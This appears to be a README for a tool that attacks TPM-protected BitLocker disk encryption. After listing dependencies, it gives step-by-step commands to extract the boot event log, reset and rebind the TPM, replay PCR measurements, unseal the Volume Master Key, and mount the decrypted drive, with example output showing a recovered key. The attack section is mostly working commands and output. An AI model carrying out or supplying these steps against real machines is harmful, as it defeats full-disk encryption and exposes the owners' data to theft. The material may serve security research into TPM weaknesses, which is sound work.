## OS Dependencies (Fedora Live Linux has prebuilt packages in repo) ##
- Install python3-devel required for tpm-tss ``dnf install python3-devel`` 
- ``sudo dnf install libtool automake autoconf autoconf-archive``
- ``sudo dnf install tpm2-tss-devel``
- ``dnf install dislocker dislocker-fuse``

## Project Dependencies ##
- Installing this package only works if installed directly from the git repo but doesnt work if installed 
from pip.

  Commit number during installation https://github.com/tpm2-software/tpm2-pytss/commit/6ab4c74e6fb3da7cd38e97c1f8e92532312f8439
 
  ``pip install git+https://github.com/tpm2-software/tpm2-pytss.git`` 
- ``pip install tabulate``

- Download Win Prod CA 2011 Certificates && Mic UEFI CA 2011 used for secure boot inside ``TpmEventlog/data`` directory.
  
  Certifcate used by Windows 11 https://go.microsoft.com/fwlink/?LinkId=321192
  
  Certificate used by third party https://go.microsoft.com/fwlink/p/?LinkID=321194
  
- Extract bitlocker volume metadata with dislocker and save it in ``TpmEventlog/data/metadata``

``dislocker-metadata -V /dev/{windows volume and bitlocker protected partition} | cat > metadata-secboot``

- Get signature owner guid from the live linux environment which is used to calculate the measured boot digest
  of PCR7. Save it in the config.yaml property "pcr7_uefi_guid"

  ``ls /sys/firmware/efi/efivars/*Current*``

  This command may list multiple GUID but the one with CurrentPolicy must be taken in this case.
  
  ```
  /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
  /sys/firmware/efi/efivars/CurrentPolicy-77fa9abd-0359-4d32-bd60-28f4e78f784b
  ```
## Atttack steps
- ``python main.py extract-linux-eventlog --output data/{eventlog name}.yaml``
- Modify config.yaml with the matching values for event log and Certificates path
- To do a hardware reset we have to get the device id for driver rebinding. In the following example this is
  is the output of ``dmesg | grep -i tpm`` and the id is ``MSFT0101:00``
```
[    0.000000] efi: ACPI=0x8f266000 ACPI 2.0=0x8f266014 TPMFinalLog=0x8f233000 SMBIOS=0x970dc000 SMBIOS 3.0=0x970db000 MEMATTR=0x80c17018 ESRT=0x81222398 MOKvar=0x97152000 RNG=0x8d1d2018 TPMEventLog=0x8d1ca018 
[    0.003181] ACPI: TPM2 0x000000008D272000 00004C (v04 ALASKA A M I    00000001 AMI  00000000)
[    0.003199] ACPI: Reserving TPM2 table memory at [mem 0x8d272000-0x8d27204b]
[    0.529657] tpm_tis MSFT0101:00: 2.0 TPM (device-id 0x1B, rev-id 22)
[    2.011638] tpm tpm0: auth session is active

```
- Its wise to at first unbind before doing the hardware reset ``echo -n "MSFT0101:00" | tee /sys/bus/platform/drivers/tpm_tis/unbind``
- Then after the hardware reset ``echo -n "MSFT0101:00" | tee /sys/bus/platform/drivers/tpm_tis/bind``
- After rebinding tpm is detected as a new device under /dev/tpm1 which was previously /dev/tpm0
- Run replay attack sequence with the following command ``python main.py replay-pcr-events --config config.yaml``
- Run unseal.py from the project root. Update the tcti values and extracted tpm object directory value before running.
  Example output of unseal.py 
```
TPM context initialized using TCTI swtpm:host=localhost,port=2321.
Successfully loaded object
Policy session started. Handle = 03000000000403000000000000030000000000000010000b00000101002040122ab70f9c3e3b7452763357228823b3bfb3149b4023e6672fb894b50c67f30020c0dd469557404144419e39184b09a2036780d017f9cb44a6a360e09378801cc800000000000000000000000000000000
PolicyAuthValue command executed successfully.
PCR policy applied successfully using the manually verified PCR digest.
Unsealed data (hex): 2c0000000100000003200000bfd3f7f197ae5e8e63e38e55a17de679e26485d6140116c273f56b0013b735d3
Extracted last 32 bytes from 44 bytes of unsealed data
Data successfully written to unsealed-blob.bin
Volume Master Key (VMK) / LUKS Unsealed Keyslot successfully saved to unsealed-blob.bin
Policy session flushed successfully.
``` 
- Unlock and mount drive with dislocker-fuse
```
dislocker-fuse -K unsealed-blob.bin -V /dev/sda3 /mnt
ls /mnt/
 dislocker-file
mkdir /mnt2
mount /mnt/dislocker-file /mnt2

```
